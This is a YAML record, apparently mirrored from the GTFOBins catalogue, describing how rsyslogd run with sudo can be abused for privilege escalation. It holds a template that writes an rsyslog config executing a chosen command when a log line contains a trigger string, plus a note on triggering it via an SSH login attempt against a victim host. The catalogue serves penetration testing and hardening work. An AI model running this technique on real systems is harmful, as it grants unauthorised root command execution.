id: gtfobins/rsyslogd/command/sudo
type: binary
platform: linux
name: rsyslogd
phases:
- execution
- privilege-escalation
capabilities:
- command-execution
privilege_required: sudo
sources:
- project: GTFOBins
  upstream_url: https://gtfobins.github.io
  license: MIT (verify upstream LICENSE)
  upstream_version: acd5246
  last_synced: '2026-08-25'
commands:
- template: 'cat >/path/to/temp-file <<EOF

    module(load="imuxsock")

    :msg, contains, "somerandomstring" ^/path/to/command

    EOF


    rsyslogd -f /path/to/temp-file'
  comment: 'In order for this to work, one must be able to trigger one event containing the chosen string,
    e.g., `somerandomstring`. One possibility is to attempt to connect to the victim host via SSH, for
    example:


    ```

    ssh somerandomstring@victim.com

    ```'
references:
- https://gtfobins.github.io/gtfobins/rsyslogd/
tags:
- linux
- unix
- gtfobins
